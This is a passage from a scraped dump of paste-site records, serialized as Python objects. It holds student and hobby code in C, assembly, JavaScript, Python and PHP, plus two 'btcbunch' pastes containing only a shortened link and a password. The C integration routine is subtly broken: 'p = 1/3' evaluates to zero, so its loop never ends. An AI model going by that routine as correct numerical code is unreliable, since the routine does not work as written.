tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='_takumi', title='hw6.c', content='#include <math.h>\n#include <stdio.h>\n#include <stdbool.h>\n\xa0\ntypedef double afunc(double);\n\xa0\ndouble f(double x) {\n\xa0 \xa0 return -x*x+10;\n}\n\xa0\ndouble g(double x) {\n\xa0 \xa0 return x;\n}\n\xa0\ndouble root(afunc *f, afunc *g, double a, double b, double eps1) {\n\xa0 \xa0 double Fa, Fb, c;\n\xa0 \xa0 bool one_sign;\n\xa0 \xa0 while (true) {\n\xa0 \xa0 \xa0 \xa0 Fa = f(a) - g(a);\n\xa0 \xa0 \xa0 \xa0 Fb = f(b) - g(b);\n\xa0 \xa0 \xa0 \xa0 c = (a * Fb - b * Fa) / (Fb - Fa);\n\xa0 \xa0 \xa0 \xa0 one_sign = (Fa > 0) && (f((a + b) / 2) > (Fa - Fb) / 2)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0|| (Fa < 0) && (f((a+b)/2) < (Fa - Fb) / 2);\n\xa0 \xa0 \xa0 \xa0 if (one_sign) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 a = c;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if ((f(c) - g(c)) * (f(c + eps1) - g(c + eps1)) < 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 else {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 b = c;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if ((f(c) - g(c)) * (f(c - eps1) - g(c - eps1)) < 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 \xa0 return c;\n}\n\xa0\ndouble integral(afunc *f, double a, double b, double eps2) {\n\xa0 \xa0 const double p = 1/3;\n\xa0 \xa0 double n0 = 10;\n\xa0 \xa0 double h, I, In = 0, I2n = 0; //i2n - curr, in - prev\n\xa0 \xa0 while (true) {\n\xa0 \xa0 \xa0 \xa0 In = I2n;\n\xa0 \xa0 \xa0 \xa0 h = (b - a) / n0;\n\xa0 \xa0 \xa0 \xa0 I2n = 0;\n\xa0 \xa0 \xa0 \xa0 for (int i = 0; i < n0; ++i) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 I2n += f(a + (i + 0.5) * h);\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 I2n *= h;\n\xa0 \xa0 \xa0 \xa0 if ((In != 0) && (eps2 > p * fabs(In - I2n))) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 n0 *= 2;\n\xa0 \xa0 }\n\xa0 \xa0 I = I2n;\n\xa0 \xa0 return I;\n}\n\xa0\nint main(void) {\n\xa0 \xa0 printf(""%lf"", integral(f, -1, 1, 0.000000000001));\n\xa0 \xa0 return 0;\n}', date='2022-06-01 12:48:17 +00:00', hash_val='fce26d584174850efdabb82a0ccd4ee9', url='/A5PrM16v', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='HendarOfficial', title='btcbunch2', content='Link: https://cararegistrasi.com/8aM52Mp \nPass: pengencepetkaya?NGEPET', date='2022-06-01 12:46:38 +00:00', hash_val='8643ca00de48f8fb814c113cb1706960', url='/27LLDR46', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='HendarOfficial', title='btcbunch', content='pengencepetkaya?NGEPET', date='2022-06-01 12:45:19 +00:00', hash_val='fc5d8fe7f92d8fd38f6bd5e4848d452a', url='/QLzUVVFP', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='_takumi', title='asm..', content="section .rodata\n\xa0 \xa0 ;fstr dd '%lf', 0\n\xa0 \xa0 const1 dd 1\n\xa0 \xa0 const2 dd 2\n\xa0 \xa0 const3 dd 3\n\xa0 \xa0 \nsection .text\nglobal f1\nglobal f2\nglobal f3\n;global CMAIN\n;CMAIN:\n; \xa0 \xa0mov ebp, esp\n; \xa0 \xa0and esp, -16\n; \xa0 \xa0sub esp, 16\n; \xa0 \xa0mov dword [esp], 10\n; \xa0 \xa0mov dword [esp + 4], 0\n; \xa0 \xa0finit\n; \xa0 \xa0call f3\n; \xa0 \xa0mov dword [esp], fstr\n; \xa0 \xa0fstp qword [esp+4]\n; \xa0 \xa0call printf\n; \xa0 \xa0xor eax, eax\n; \xa0 \xa0mov esp, ebp\n; \xa0 \xa0ret\n\xa0 \xa0 \nf1:\n\xa0 \xa0 push ebp\n\xa0 \xa0 mov ebp, esp\n\xa0 \xa0 finit\n\xa0 \xa0 fld qword [ebp + 8]\n\xa0 \xa0 fld1\n\xa0 \xa0 fsubp\n\xa0 \xa0 fld st0\n\xa0 \xa0 fmulp\n\xa0 \xa0 fld1\n\xa0 \xa0 faddp\n\xa0 \xa0 fild dword [const3]\n\xa0 \xa0 fxch\n\xa0 \xa0 fdivp\n\xa0 \xa0 mov esp, ebp\n\xa0 \xa0 pop ebp\n\xa0 \xa0 ret\n\xa0 \xa0 \nf2:\n\xa0 \xa0 push ebp\n\xa0 \xa0 mov ebp, esp\n\xa0 \xa0 finit\n\xa0 \xa0 fld1\n\xa0 \xa0 fld dword [const2]\n\xa0 \xa0 fdivp\n\xa0 \xa0 fld qword [ebp + 8]\n\xa0 \xa0 faddp\n\xa0 \xa0 fsqrt\n\xa0 \xa0 mov esp, ebp\n\xa0 \xa0 pop ebp\n\xa0 \xa0 ret\n\xa0 \xa0 \nf3:\n\xa0 \xa0 push ebp\n\xa0 \xa0 mov ebp, esp\n\xa0 \xa0 finit\n\xa0 \xa0 sub esp, 8\n\xa0 \xa0 fldl2e\n\xa0 \xa0 fild dword [const2]\n\xa0 \xa0 fyl2x\n\xa0 \xa0 fist dword [ebp - 4]\n\xa0 \xa0 fild dword [ebp - 4]\n\xa0 \xa0 fsubp\n\xa0 \xa0 f2xm1\n\xa0 \xa0 fld1\n\xa0 \xa0 faddp\n\xa0 \xa0 fild dword [ebp - 4]\n\xa0 \xa0 fxch\n\xa0 \xa0 fscale\n\xa0 \xa0 fld qword [ebp + 8]\n\xa0 \xa0 fchs\n\xa0 \xa0 fxch\n\xa0 \xa0 fyl2x\n\xa0 \xa0 fist dword [ebp - 4]\n\xa0 \xa0 fild dword [ebp - 4]\n\xa0 \xa0 fsubp\n\xa0 \xa0 f2xm1\n\xa0 \xa0 fld1\n\xa0 \xa0 faddp\n\xa0 \xa0 fild dword [ebp - 4]\n\xa0 \xa0 fxch\n\xa0 \xa0 fscale\n\xa0 \xa0 leave \n\xa0 \xa0 ret", date='2022-06-01 12:41:44 +00:00', hash_val='c7d4f70c137fe1cc0b23c10f01af0577', url='/mVANj5R8', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Dragomana', title='Service', content='function solve() {\n\xa0 \xa0 let secComplete = document.getElementById(\'completed-orders\')\n\xa0 \xa0 let secRcvOrders = document.getElementById(\'received-orders\')\n\xa0 \xa0 let nameProd = document.getElementById(\'type-product\')\n\xa0 \xa0 let problemDesc = document.getElementById(\'description\')\n\xa0 \xa0 let client = document.getElementById(\'client-name\')\n\xa0 \xa0 let phone = document.getElementById(\'client-phone\')\n\xa0 \xa0 let btnSubmit = document.querySelector(\'button[type=""submit""]\')\n\xa0 \xa0 btnSubmit.addEventListener(\'click\', submitOrder)\n\xa0 \xa0 let btnClear = document.querySelector(\'#completed-orders > button\')\n\xa0 \xa0 btnClear.addEventListener(\'click\', (e) => {\n\xa0 \xa0 \xa0 \xa0 let divClear = e.target.parentNode\n\xa0 \xa0 \xa0 \xa0 while(divClear.children[3]){\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 divClear.children[3].remove()\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 })\n\xa0\n\xa0 \xa0 // problemDesc.value = \'Bad Battery\'\n\xa0 \xa0 // client.value = \'Some Name\'\n\xa0 \xa0 // phone.value = \'08888888\'\n\xa0 \xa0 \n\xa0 \xa0 function submitOrder(e) {\n\xa0 \xa0 \xa0 \xa0 e.preventDefault()\n\xa0 \xa0 \xa0 \xa0 \nif(!problemDesc.value || !client.value || !phone.value){\n\xa0 \xa0 return\n}\n\xa0\n\xa0 \xa0 \xa0 \xa0 let div = document.createElement(\'div\')\n\xa0 \xa0 \xa0 \xa0 let h2 = document.createElement(\'h2\')\n\xa0 \xa0 \xa0 \xa0 let h3 = document.createElement(\'h3\')\n\xa0 \xa0 \xa0 \xa0 let h4 = document.createElement(\'h4\')\n\xa0 \xa0 \xa0 \xa0 let btnStart = document.createElement(\'button\')\n\xa0 \xa0 \xa0 \xa0 let btnFinish = document.createElement(\'button\')\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 div.classList.add(\'container\')\n\xa0 \xa0 \xa0 \xa0 h2.textContent = `Product type for repair: ${nameProd.value}`\n\xa0 \xa0 \xa0 \xa0 h3.textContent = `Client information: ${client.value}, ${phone.value}`\n\xa0 \xa0 \xa0 \xa0 h4.textContent = `Description of the problem: ${problemDesc.value}`\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 btnStart.classList.add(\'start-btn\')\n\xa0 \xa0 \xa0 \xa0 btnStart.textContent = \'Start repair\'\n\xa0 \xa0 \xa0 \xa0 btnStart.addEventListener(\'click\', () => {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 btnFinish.disabled = false\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 btnStart.disabled = true\n\xa0 \xa0 \xa0 \xa0 })\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 btnFinish.classList.add(\'finish-btn\')\n\xa0 \xa0 \xa0 \xa0 btnFinish.textContent = \'Finish repair\'\n\xa0 \xa0 \xa0 \xa0 btnFinish.disabled = true\n\xa0 \xa0 \xa0 \xa0 btnFinish.addEventListener(\'click\', finishAction)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 function finishAction(e) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 let newDiv = e.target.parentNode\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 newDiv.children[3].remove()\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 newDiv.children[3].remove()\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 console.log(newDiv);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 secComplete.appendChild(div)\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 div.appendChild(h2)\n\xa0 \xa0 \xa0 \xa0 div.appendChild(h3)\n\xa0 \xa0 \xa0 \xa0 div.appendChild(h4)\n\xa0 \xa0 \xa0 \xa0 div.appendChild(btnStart)\n\xa0 \xa0 \xa0 \xa0 div.appendChild(btnFinish)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 secRcvOrders.appendChild(div)\n\xa0\n\xa0 \xa0 \xa0 \xa0 problemDesc.value = \'\'\n\xa0 \xa0 \xa0 \xa0 client.value = \'\'\n\xa0 \xa0 \xa0 \xa0 phone.value = \'\'\n\xa0 \xa0 }\n}', date='2022-06-01 12:09:10 +00:00', hash_val='115da38eddeceac882850d1e2ab4d1b6', url='/3Gh74aqt', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Tss_Flmzy', title='MVP для приложения "Пенькофф Инвестиции"', content="input_file = open('input.txt')\n\xa0\nn = int(input_file.readline())\nnames = dict()\nactioners = dict()\n\xa0\nfor line in input_file.readlines():\n\xa0 \xa0 line = line.split()\n\xa0\n\xa0 \xa0 answer = line[0]\n\xa0 \xa0 data = line[1:]\n\xa0\n\xa0 \xa0 if answer == 'BUY':\n\xa0\n\xa0 \xa0 \xa0 \xa0 name, actioner, count = data\n\xa0\n\xa0 \xa0 \xa0 \xa0 if actioner not in actioners:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 actioners[actioner] = 1\n\xa0\n\xa0 \xa0 \xa0 \xa0 count = int(count)\n\xa0\n\xa0 \xa0 \xa0 \xa0 if name not in names:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 names[name] = dict({actioner: int(count)})\n\xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if actioner not in names[name]:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 names[name][actioner] = count\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 names[name][actioner] += count\n\xa0\n\xa0 \xa0 elif answer == 'SELL':\n\xa0\n\xa0 \xa0 \xa0 \xa0 name, actioner, count = data\n\xa0\n\xa0 \xa0 \xa0 \xa0 if actioner not in actioners:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 actioners[actioner] = 1\n\xa0\n\xa0 \xa0 \xa0 \xa0 count = int(count)\n\xa0\n\xa0 \xa0 \xa0 \xa0 if name in names:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if actioner in names[name]:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 names[name][actioner] -= count\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if names[name][actioner] < 0:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 names[name][actioner] = 0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 names[name][actioner] = 0\n\xa0\n\xa0 \xa0 elif answer == 'PRICE_RAISE':\n\xa0\n\xa0 \xa0 \xa0 \xa0 actioner, percents = data\n\xa0\n\xa0 \xa0 \xa0 \xa0 percents = float(percents)\n\xa0\n\xa0 \xa0 \xa0 \xa0 if actioner not in actioners:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 actioners[actioner] = 1 + percents / 100\n\xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 actioners[actioner] *= 1 + percents / 100\n\xa0\n\xa0 \xa0 elif answer == 'PRICE_FALL':\n\xa0\n\xa0 \xa0 \xa0 \xa0 actioner, percents = data\n\xa0\n\xa0 \xa0 \xa0 \xa0 percents = float(percents)\n\xa0\n\xa0 \xa0 \xa0 \xa0 if actioner not in actioners:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 actioners[actioner] = 1 - float(percents) / 100\n\xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 actioners[actioner] *= 1 - float(percents) / 100\n\xa0\n\xa0 \xa0 elif answer == 'BALANCE':\n\xa0\n\xa0 \xa0 \xa0 \xa0 name = data[0]\n\xa0\n\xa0 \xa0 \xa0 \xa0 balance = 0\n\xa0\n\xa0 \xa0 \xa0 \xa0 if name in names:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (actioner, count) in names[name].items():\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 balance += count * actioners[actioner]\n\xa0\n\xa0 \xa0 \xa0 \xa0 print(round(balance))", date='2022-06-01 12:04:44 +00:00', hash_val='094f99d6ae436bec04858a7b6cb6315a', url='/3uzkDY3Q', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='wheresTheAnyKey', title='Paste Ping', content='PasteBin API Check', date='2022-06-01 12:01:23 +00:00', hash_val='ce23c8313fe51c917a33b8b14e05f10a', url='/Sw34xvVF', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='MartinGeorgiev', title='01. SoftUni Reception', content='<?php\n\xa0\n$a = readline();\n$b = readline();\n$c = readline();\n$questions = readline();\n\xa0\n$answers = $a + $b + $c;\n\xa0\n$hours = ceil($questions/$answers);\n$hours += floor($hours / 3);\nif($hours%4==0&&$hours>1){\n$hours--;\n}\necho ""Time needed: {$hours}h."";', date='2022-06-01 12:00:18 +00:00', hash_val='14c49b3a1caf29db3dc122f325610662', url='/zcntj0cc', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='bokunda', title='QR Code decoder', content='import time\n\xa0\nimport cv2\nimport numpy as np\nfrom pyzbar.pyzbar import decode\n\xa0\ndef current_milli_time():\n\xa0 \xa0 return round(time.time() * 1000)\n\xa0\ndef decoder():\n\xa0\n\xa0 \xa0 startTime = current_milli_time()\n\xa0 \xa0 #image = cv2.imread(\'D:\\\\testv3\\\\.processed\\\\12206331010100012966101\\\\pera.tiff\')\n\xa0 \xa0 image = cv2.imread(\'C:\\\\Users\\\\spokimica\\\\Documents\\\\12200130010100012086591_20212210000623711\\\\_P_1.jpg\')\n\xa0\n\xa0 \xa0 gray_img = cv2.cvtColor(image,0)\n\xa0 \xa0 barcode = decode(gray_img)\n\xa0\n\xa0 \xa0 for obj in barcode:\n\xa0 \xa0 \xa0 \xa0 points = obj.polygon\n\xa0 \xa0 \xa0 \xa0 (x,y,w,h) = obj.rect\n\xa0 \xa0 \xa0 \xa0 pts = np.array(points, np.int32)\n\xa0 \xa0 \xa0 \xa0 pts = pts.reshape((-1, 1, 2))\n\xa0 \xa0 \xa0 \xa0 cv2.polylines(image, [pts], True, (0, 255, 0), 3)\n\xa0\n\xa0 \xa0 \xa0 \xa0 barcodeData = obj.data.decode(""utf-8"")\n\xa0 \xa0 \xa0 \xa0 barcodeType = obj.type\n\xa0 \xa0 \xa0 \xa0 string = ""Data: "" + str(barcodeData) + "" | Type: "" + str(barcodeType)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 print(""Barcode: ""+barcodeData +"" | Type: ""+barcodeType)\n\xa0\n\xa0 \xa0 endTime = current_milli_time()\n\xa0\n\xa0 \xa0 processingTime = endTime - startTime\n\xa0 \xa0 print(""Processing time: "" + str(processingTime) + "" [ms]"")\n\xa0\ndecoder()', date='2022-06-01 11:56:44 +00:00', hash_val='b90b5c5eb9eb895851f0f23a2b6e16c1', url='/meip76d6', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='szotyi41', title='Untitled', content="<?php\n\xa0\n$example = [\n\xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'content_name' => 'Babaváró',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'placeholders' => []\n\xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'content_name' => 'Személyi kölcsön',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'placeholders' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'background_image_1' => [\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => true,\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'tag',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'szemelyi_kolcson'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'background_image_2' => [\n\xa0\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => true,\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'tag',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'szemelyi_kolcson'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'headline_1' => [\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Combine or just use random\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'combine' => 'all|random|each',\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Can show the same asset in any other placeholders if its selected\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_row' => false, \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'repeat_in_content' => false,\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'selected' => [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'text',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 '_id' => 'abc124',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'Vedd fel álmaid kölcsönét!',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'type' => 'text',\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 'value' => 'Készpénzben!'\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ],\n\xa0 \xa0 \xa0 \xa0 \xa0 